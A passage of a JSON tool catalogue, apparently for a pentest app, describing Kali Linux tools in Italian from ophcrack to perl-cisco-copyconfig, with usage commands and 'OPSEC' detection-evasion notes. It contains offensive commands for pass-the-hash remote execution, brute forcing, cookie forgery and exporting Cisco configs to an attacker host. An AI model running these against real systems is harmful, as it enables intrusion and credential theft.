    "version": "3.8.0",
    "icon": "../app/icons/ophcrack-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ophcrack/",
    "desc": "Cracker password Windows via rainbow tables LM/NTLM con interfaccia grafica.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ophcrack</strong> è un cracker di password Windows che utilizza rainbow tables precompilate per recuperare password LM e NTLM in tempi molto rapidi. Fornisce interfaccia grafica intuitiva e supporta boot da Live CD per accesso offline ai sistemi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Rainbow Tables:</strong> utilizza tabelle precompilate per crack veloce senza brute-force tradizionale</p><p><strong>GUI Intuitiva:</strong> interfaccia grafica per visualizzare progresso e risultati in tempo reale</p><p><strong>Live CD:</strong> disponibile come sistema bootable per crack offline senza accesso al sistema</p><p><strong>Multi-hash:</strong> supporta LM, NTLM e combinazioni per compatibilità con tutte le versioni Windows</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio interfaccia grafica\nophcrack\n\n# Caricamento SAM da sistema locale\nophcrack -d /path/to/tables -t /path/to/SAM\n\n# Utilizzo tabelle specifiche\nophcrack -d /path/to/tables -n 4</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>password recovery</strong>, recupero credenziali su sistemi Windows bloccati.</p><p>Per <strong>forensics</strong>, accesso a sistemi durante investigazioni autorizzate.</p><p>Per <strong>audit</strong>, verifica robustezza password aziendali contro rainbow table attacks.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Dimensione:</strong> rainbow tables richiedono GB di spazio disco.</p><p><strong>Detection:</strong> boot da Live CD evita log sul sistema target.</p><p><strong>Limitazioni:</strong> password lunghe e complesse resistono alle rainbow tables standard.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
    "id": "oscanner",
    "name": "oscanner",
    "version": "1.0.6",
    "icon": "../app/icons/oscanner-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/oscanner/",
    "desc": "Scanner per database Oracle: enumeration SID, account, privilegi e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>OScanner</strong> è uno scanner Java per database Oracle che esegue enumeration completa di SID, account utente, privilegi, ruoli e identifica vulnerabilità note e misconfigurazioni. Strumento essenziale per pentest su infrastrutture Oracle.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SID Enumeration:</strong> discovery di Service Identifiers attraverso tecniche multiple</p><p><strong>Account Testing:</strong> verifica credenziali di default e weak password su account Oracle</p><p><strong>Privilege Mapping:</strong> mappa privilegi e ruoli assegnati agli utenti identificati</p><p><strong>Vuln Detection:</strong> identifica vulnerabilità note e patch mancanti sul database</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base di un host Oracle\noscanner -s target_ip\n\n# Scan con porta specifica\noscanner -s target_ip -P 1521\n\n# Enumeration con wordlist custom\noscanner -s target_ip -f sid_wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>database pentesting</strong>, enumeration completa di istanze Oracle aziendali.</p><p>Per <strong>compliance audit</strong>, verifica configurazioni sicure e account di default rimossi.</p><p>Per <strong>vulnerability assessment</strong>, identificazione patch mancanti e misconfigurazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> scan intensivi generano log sul database.</p><p><strong>Lockout:</strong> troppi tentativi di login possono bloccare account.</p><p><strong>Detection:</strong> query anomale facilmente rilevabili da DBA.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "osrframework",
    "name": "osrframework",
    "version": "0.20.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/osrframework/",
    "desc": "Suite OSINT per ricerca username, email, domini su centinaia di piattaforme online.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>OSRFramework</strong> è una suite completa di strumenti OSINT che permette di cercare username, email e altre informazioni su centinaia di piattaforme online. Include moduli specializzati come usufy per username lookup, mailfy per email verification e domainfy per ricerche su domini.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Usufy:</strong> ricerca username su oltre 300 piattaforme social e servizi online</p><p><strong>Mailfy:</strong> verifica esistenza email e trova account associati</p><p><strong>Domainfy:</strong> ricerca domini registrati con pattern specifici</p><p><strong>Searchfy:</strong> aggregazione risultati da motori di ricerca multipli</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Ricerca username su tutte le piattaforme\nusufy -n target_username\n\n# Verifica email\nmailfy -n target@email.com\n\n# Ricerca domini con pattern\ndomainfy -n target_company -t all\n\n# Ricerca telefono\nphonefy -n +39123456789</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT investigations</strong>, profiling completo di target attraverso presenza online.</p><p>Per <strong>social engineering prep</strong>, raccolta informazioni per campagne di phishing.</p><p>Per <strong>brand monitoring</strong>, identificazione account fake o impersonation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate limiting:</strong> query massive possono triggerare blocchi su piattaforme.</p><p><strong>Attribution:</strong> alcune query richiedono VPN/Tor per anonimato.</p><p><strong>API keys:</strong> moduli avanzati richiedono API key per funzionalità complete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "p0f",
    "name": "p0f",
    "version": "3.09b",
    "icon": "../app/icons/p0f-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/p0f/",
    "desc": "Passive OS fingerprinting: identifica sistemi operativi analizzando traffico TCP/IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>p0f</strong> è un tool di passive OS fingerprinting che identifica sistemi operativi, applicazioni e configurazioni di rete analizzando il traffico TCP/IP senza generare pacchetti attivi. Perfetto per reconnaissance stealth su reti monitorate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Passive Fingerprinting:</strong> identifica OS solo osservando traffico esistente</p><p><strong>TCP/IP Analysis:</strong> analizza TTL, window size, opzioni TCP per fingerprinting</p><p><strong>Network Discovery:</strong> mappa host e sistemi su rete senza scan attivi</p><p><strong>Application Detection:</strong> identifica server web, client e altre applicazioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Sniffing passivo su interfaccia\np0f -i eth0\n\n# Analisi da file pcap\np0f -r capture.pcap\n\n# Output su file di log\np0f -i eth0 -o results.log\n\n# Promiscuous mode per traffico non diretto\np0f -i eth0 -p</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>stealth recon</strong>, identificazione OS senza generare traffico rilevabile.</p><p>Per <strong>network mapping</strong>, discovery passivo di host e servizi.</p><p>Per <strong>IDS integration</strong>, arricchimento dati con fingerprint OS automatico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Stealth:</strong> non genera traffico, completamente invisibile.</p><p><strong>Limitazioni:</strong> richiede traffico esistente da analizzare.</p><p><strong>Accuracy:</strong> fingerprint meno preciso di scan attivi, NAT può confondere.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "pacu",
    "name": "pacu",
    "version": "1.6.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pacu/",
    "desc": "Framework AWS exploitation per enumeration, privilege escalation e persistence su cloud.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pacu</strong> è un framework open-source per AWS exploitation sviluppato da Rhino Security Labs. Fornisce moduli per enumeration, privilege escalation, persistence e data exfiltration su ambienti AWS. È l'equivalente di Metasploit per cloud AWS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumeration Modules:</strong> discovery IAM, EC2, S3, Lambda, RDS e altri servizi AWS</p><p><strong>Privilege Escalation:</strong> oltre 20 tecniche di privesc IAM automatizzate</p><p><strong>Persistence:</strong> creazione backdoor, chiavi API nascoste, Lambda persistenti</p><p><strong>Data Exfiltration:</strong> dump secrets, database, oggetti S3</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio Pacu\npacu\n\n# Impostazione credenziali\nset_keys\n\n# Esecuzione modulo enumeration\nrun iam__enum_users_roles_policies_groups\n\n# Privilege escalation check\nrun iam__privesc_scan\n\n# Enumeration EC2\nrun ec2__enum</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>cloud pentesting</strong>, assessment completo di sicurezza AWS.</p><p>Per <strong>red team</strong>, simulazione attacchi realistici su infrastrutture cloud.</p><p>Per <strong>CTF/lab</strong>, pratica su vulnerabilità IAM e misconfigurazioni AWS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>CloudTrail:</strong> tutte le azioni sono loggate su CloudTrail.</p><p><strong>GuardDuty:</strong> enumeration intensiva triggerà alert GuardDuty.</p><p><strong>Credenziali:</strong> richiede access keys compromesse o session tokens validi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Cloud"
    ],
    "notes": null
  },
  {
    "id": "padbuster",
    "name": "padbuster",
    "version": "0.3.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/padbuster/",
    "desc": "Exploita vulnerabilità padding oracle per decifrare e forgiare cookie crittografati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PadBuster</strong> è un tool Perl per sfruttare vulnerabilità padding oracle in implementazioni CBC. Permette di decifrare dati crittografati e forgiare token validi senza conoscere la chiave, basandosi su differenze nelle risposte di errore padding.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decrypt Mode:</strong> decifra dati crittografati sfruttando l'oracle</p><p><strong>Encrypt Mode:</strong> forgia dati crittografati validi con plaintext arbitrario</p><p><strong>Block Analysis:</strong> gestisce cifratura a blocchi CBC con varie dimensioni</p><p><strong>Encoding Support:</strong> base64, hex e altri formati di encoding</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Decrypt di un cookie vulnerabile\npadbuster http://target/app encryptedCookie 8 -cookies \"auth=encryptedCookie\"\n\n# Forgiatura nuovo valore\npadbuster http://target/app encryptedCookie 8 -plaintext \"admin=true\"\n\n# Con encoding specifico\npadbuster http://target/app data 16 -encoding 1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web exploitation</strong>, bypass autenticazione via cookie tampering.</p><p>Per <strong>crypto attacks</strong>, sfruttamento implementazioni CBC vulnerabili.</p><p>Per <strong>ASP.NET viewstate</strong>, attacchi su ViewState mal configurato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requests:</strong> richiede molte richieste HTTP (256 per byte).</p><p><strong>Logging:</strong> attività facilmente rilevabile nei log.</p><p><strong>Rate limiting:</strong> applicazioni possono bloccare dopo troppi errori.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Crypto"
    ],
    "notes": null
  },
  {
    "id": "parsero",
    "name": "parsero",
    "version": "0.81~git20140929",
    "icon": "../app/icons/parsero-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/parsero/",
    "desc": "Analizza robots.txt per trovare directory nascoste e percorsi sensibili esposti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Parsero</strong> è un tool Python che analizza il file robots.txt di un sito web per identificare directory e percorsi che gli amministratori vogliono nascondere ai crawler. Spesso queste entry Disallow rivelano aree sensibili come admin panel e backup.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>robots.txt Parsing:</strong> estrae tutte le entry Disallow dal file</p><p><strong>Status Check:</strong> verifica se i percorsi sono effettivamente accessibili</p><p><strong>Multiple Targets:</strong> supporta scan di liste di URL</p><p><strong>Output Formats:</strong> risultati in formato standard o JSON</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi robots.txt singolo target\nparsero -u http://target.com\n\n# Con verifica accessibilità\nparsero -u http://target.com -sb\n\n# Lista di target\nparsero -f targets.txt\n\n# Output solo path accessibili\nparsero -u http://target.com -sb</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web recon</strong>, discovery rapido di percorsi interessanti.</p><p>Per <strong>content discovery</strong>, identificazione admin panel, backup, config files.</p><p>Per <strong>scope expansion</strong>, trovare funzionalità nascoste della webapp.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Basso rumore:</strong> singola richiesta per robots.txt iniziale. <strong>Status check:</strong> verifiche aggiuntive generano più traffico.</p><p><strong>Legale:</strong> robots.txt è pubblico, ma accesso a path sensibili potrebbe essere unauthorized.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "passdetective",
    "name": "passdetective",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/passdetective/",
    "desc": "Cerca password e secrets nella cronologia browser e file locali su sistemi compromessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PassDetective</strong> è un tool di credential harvesting che cerca password, secrets e informazioni sensibili nella cronologia browser, cache, file locali e application data su sistemi compromessi. Automatizza la ricerca post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Browser History:</strong> estrae URL con password in query string</p><p><strong>Cache Analysis:</strong> cerca credenziali in file cache browser</p><p><strong>Local Files:</strong> scansiona file comuni per password hardcoded</p><p><strong>Pattern Matching:</strong> regex customizzabili per tipi specifici di secrets</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo sistema locale\npassdetective\n\n# Scan solo browser history\npassdetective --browser-only\n\n# Con pattern custom\npassdetective --pattern \"api[_-]?key\"\n\n# Output JSON\npassdetective --output results.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, raccolta credenziali dopo accesso a sistema.</p><p>Per <strong>lateral movement</strong>, trovare password riutilizzate per altri servizi.</p><p>Per <strong>forensics</strong>, analisi artefatti utente durante investigation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Disk access:</strong> lettura file potrebbe essere monitorata da EDR.</p><p><strong>Browser profiles:</strong> accesso a profili utente richiede privilegi adeguati.</p><p><strong>Cleanup:</strong> rimuovere eventuali file temporanei creati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "passing-the-hash",
    "name": "passing-the-hash",
    "version": "0~2015.12.37",
    "icon": "../app/icons/passing-the-hash-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/passing-the-hash/",
    "desc": "Toolkit per autenticazione NTLM con hash invece di password in clear-text.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Passing-the-Hash</strong> è un toolkit che implementa la tecnica Pass-the-Hash per autenticarsi a servizi Windows usando solo l'hash NTLM, senza bisogno della password in chiaro. Include versioni modificate di smbclient, winexe e altri tool.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PTH-smbclient:</strong> accesso SMB share usando hash NTLM</p><p><strong>PTH-winexe:</strong> esecuzione comandi remoti via hash</p><p><strong>PTH-wmic:</strong> query WMI con autenticazione hash-based</p><p><strong>PTH-rpcclient:</strong> chiamate RPC autenticate con hash</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SMB access con hash\npth-smbclient //target/share -U domain/user%hash:ntlmhash\n\n# Esecuzione comandi remoti\npth-winexe -U domain/user%hash:ntlmhash //target cmd.exe\n\n# Query WMI\npth-wmic -U domain/user%hash:ntlmhash //target \"select * from Win32_Process\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>lateral movement</strong>, movimento tra sistemi con hash recuperati.</p><p>Per <strong>AD exploitation</strong>, accesso a risorse con credenziali domain admin.</p><p>Per <strong>persistence</strong>, mantenimento accesso senza password in chiaro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Event logs:</strong> autenticazioni PTH loggano come normali login NTLM.</p><p><strong>Detection:</strong> SIEM possono correlare login anomali da IP inusuali.</p><p><strong>Credential Guard:</strong> mitigation Windows moderna limita efficacia PTH.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "patator",
    "name": "patator",
    "version": "1.0",
    "icon": "../app/icons/patator-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/patator/",
    "desc": "Brute forcer modulare multi-protocollo: SSH, FTP, HTTP, LDAP, SMB con threading.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Patator</strong> è un brute-forcer multi-threaded modulare che supporta numerosi protocolli e servizi. Progettato per essere più flessibile di Hydra, permette attacchi customizzati con condizioni di successo/fallimento configurabili e ottimo controllo del threading.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-protocollo:</strong> SSH, FTP, SMB, HTTP, LDAP, MySQL, POP3, SMTP e molti altri</p><p><strong>Condizioni Custom:</strong> definizione flessibile di successo/fallimento</p><p><strong>Threading Avanzato:</strong> controllo granulare su parallelismo e rate limiting</p><p><strong>Combo Mode:</strong> supporto per user:pass combo lists</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force SSH\npatator ssh_login host=target user=FILE0 password=FILE1 0=users.txt 1=passwords.txt\n\n# HTTP POST form\npatator http_fuzz url=http://target/login method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=pass.txt -x ignore:fgrep='Invalid'\n\n# FTP con rate limiting\npatator ftp_login host=target user=admin password=FILE0 0=passwords.txt --rate-limit=1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>password attacks</strong>, brute-force su servizi con configurazione avanzata.</p><p>Per <strong>credential stuffing</strong>, test combo lists su applicazioni.</p><p>Per <strong>pentest</strong>, verifica policy password su servizi esposti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> troppi tentativi possono bloccare account.</p><p><strong>Rate limiting:</strong> usare opzioni di throttling per evitare detection.</p><p><strong>Logging:</strong> tentativi falliti generano log abbondanti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "patchleaks",
    "name": "patchleaks",
    "version": "0.0~git20250807.2e53978",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/patchleaks/",
    "desc": "Identifica informazioni sensibili leakate nei patch e diff di repository pubblici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PatchLeaks</strong> è un tool che analizza patch, diff e commit di repository pubblici per identificare secrets, credenziali, API keys e altre informazioni sensibili accidentalmente incluse nei cambiamenti di codice.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Diff Analysis:</strong> scansiona diff per pattern di secrets comuni</p><p><strong>Git History:</strong> analizza storia commit per leak nel tempo</p><p><strong>Pattern Detection:</strong> rileva API keys, password, private keys, tokens</p><p><strong>Multiple Sources:</strong> supporta GitHub, GitLab, Bitbucket e repo locali</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi repository GitHub\npatchleaks https://github.com/org/repo\n\n# Scan repo locale\npatchleaks /path/to/local/repo\n\n# Analisi singolo commit\npatchleaks --commit abc123 /path/to/repo\n\n# Output JSON\npatchleaks --json https://github.com/org/repo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, ricerca secrets in repo pubblici di target.</p><p>Per <strong>supply chain</strong>, identificazione leak in dipendenze.</p><p>Per <strong>security audit</strong>, verifica assenza leak nella propria codebase.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate limiting:</strong> API Git hanno limiti di richieste.</p><p><strong>Legal:</strong> repo pubblici sono accessibili, ma uso di secrets trovati è altra questione.</p><p><strong>Attribution:</strong> clonare repo pubblici è tracciabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "pdf-parser",
    "name": "pdf-parser",
    "version": "0.7.13",
    "icon": "../app/icons/pdf-parser-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pdf-parser/",
    "desc": "Analizza struttura PDF per identificare JavaScript, stream sospetti e payload malevoli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pdf-parser</strong> è un tool di Didier Stevens per analizzare la struttura interna dei file PDF. Permette di esaminare oggetti, stream, JavaScript embedded e altre componenti per identificare contenuto malevolo senza eseguire il documento.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Object Parsing:</strong> estrae e visualizza tutti gli oggetti PDF</p><p><strong>Stream Decode:</strong> decodifica stream compressi FlateDecode, ASCIIHexDecode</p><p><strong>JavaScript Extract:</strong> identifica e estrae codice JavaScript embedded</p><p><strong>Reference Analysis:</strong> traccia riferimenti tra oggetti per capire flusso</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi struttura PDF\npdf-parser.py malicious.pdf\n\n# Estrazione oggetto specifico\npdf-parser.py --object 10 malicious.pdf\n\n# Ricerca keyword\npdf-parser.py --search javascript malicious.pdf\n\n# Dump stream decodificato\npdf-parser.py --object 10 --filter --raw malicious.pdf</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, analisi statica di PDF malevoli.</p><p>Per <strong>incident response</strong>, triage rapido di allegati sospetti.</p><p>Per <strong>threat intel</strong>, estrazione IOC da campioni PDF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Sicuro:</strong> analisi statica, non esegue contenuto.</p><p><strong>Isolamento:</strong> comunque consigliato analizzare in VM.</p><p><strong>Obfuscation:</strong> malware avanzato può usare obfuscation complessa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "pdfid",
    "name": "pdfid",
    "version": "0.2.10",
    "icon": "../app/icons/pdfid-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pdfid/",
    "desc": "Triage rapido di file PDF: conta oggetti JavaScript, OpenAction, embedded files.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pdfid</strong> è un tool di triage rapido per PDF che conta gli oggetti potenzialmente pericolosi come JavaScript, OpenAction, embedded files, URI. Fornisce una valutazione veloce della pericolosità senza analisi approfondita.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Object Counting:</strong> conta occorrenze di keyword rischiose</p><p><strong>Quick Triage:</strong> valutazione in secondi di potenziale pericolosità</p><p><strong>Batch Analysis:</strong> analisi di directory con molti PDF</p><p><strong>Plugin Support:</strong> estensibile con plugin custom</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Triage singolo file\npdfid.py suspicious.pdf\n\n# Analisi ricorsiva directory\npdfid.py -r /path/to/pdfs/\n\n# Output extra verboso\npdfid.py -e suspicious.pdf\n\n# Con plugin aggiuntivi\npdfid.py -p plugin_triage suspicious.pdf</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>SOC triage</strong>, valutazione rapida allegati email sospetti.</p><p>Per <strong>malware analysis</strong>, screening iniziale prima di analisi dettagliata.</p><p>Per <strong>batch processing</strong>, filtering di grandi quantità di PDF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Veloce:</strong> analisi in millisecondi per file.</p><p><strong>Non esaustivo:</strong> indica sospetto, non conferma malware.</p><p><strong>Complementare:</strong> usare con pdf-parser per analisi completa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "peass-ng",
    "name": "peass-ng",
    "version": "20250801.03e73bf3",
    "icon": "../app/icons/peass-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/peass-ng/",
    "desc": "Script automatici per privilege escalation su Linux, Windows e macOS con output colorato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PEASS-ng</strong> (Privilege Escalation Awesome Scripts Suite) è una collezione di script per enumerazione automatica e identificazione di vettori di privilege escalation. Include linPEAS, winPEAS e macPEAS con output colorato che evidenzia finding critici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>linPEAS:</strong> enumeration completa Linux per privesc, incluso kernel exploits, SUID, capabilities</p><p><strong>winPEAS:</strong> enumeration Windows per privesc, servizi vulnerabili, registry, scheduled tasks</p><p><strong>macPEAS:</strong> script equivalente per sistemi macOS</p><p><strong>Colored Output:</strong> highlighting automatico di finding critici in rosso</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># LinPEAS - esecuzione completa\n./linpeas.sh\n\n# LinPEAS solo check veloci\n./linpeas.sh -s\n\n# WinPEAS via cmd\nwinpeas.exe\n\n# Output su file\n./linpeas.sh | tee linpeas_output.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>privilege escalation</strong>, identificazione automatica di tutti i vettori possibili.</p><p>Per <strong>CTF</strong>, enumeration rapida dopo foothold iniziale.</p><p>Per <strong>security audit</strong>, verifica configurazioni sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> esegue moltissime verifiche, facilmente rilevabile.</p><p><strong>EDR:</strong> winPEAS spesso bloccato da AV/EDR.</p><p><strong>Versioni:</strong> esistono versioni obfuscate per bypass.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Multi_Platform"
    ],
    "notes": null
  },
  {
    "id": "perl-cisco-copyconfig",
    "name": "perl-cisco-copyconfig",
    "version": "1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/perl-cisco-copyconfig/",
    "desc": "Script Perl per estrarre configurazione da dispositivi Cisco via SNMP e TFTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>perl-cisco-copyconfig</strong> è uno script Perl che sfrutta SNMP per triggerare export della configurazione di dispositivi Cisco verso un server TFTP controllato. Permette di ottenere running-config e startup-config da router e switch.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SNMP Exploitation:</strong> usa OID Cisco per triggerare config copy</p><p><strong>TFTP Export:</strong> configurazione esportata verso server TFTP attacker</p><p><strong>Multi-device:</strong> supporta router, switch e altri dispositivi Cisco</p><p><strong>Config Types:</strong> può estrarre running-config e startup-config</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup server TFTP su macchina attacker\natftpd --daemon /tftp\n\n# Estrazione running-config\ncisco-copy-config.pl target_ip community_string attacker_ip\n\n# Con community string nota\ncisco-copy-config.pl 192.168.1.1 public 192.168.1.100</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network pentest</strong>, estrazione configurazioni Cisco con SNMP esposto.</p><p>Per <strong>credential harvesting</strong>, recupero password enable e credenziali da config.</p><p>Per <strong>network mapping</strong>, comprensione topologia e ACL.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> operazione SNMP loggata sui dispositivi.</p><p><strong>Requisiti:</strong> richiede community string con write access.</p><p><strong>TFTP:</strong> traffico TFTP visibile sulla rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "phishery",
    "name": "phishery",
    "version": "1.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/phishery/",
    "desc": "Genera documenti Office con template injection per raccolta credenziali NTLM.",
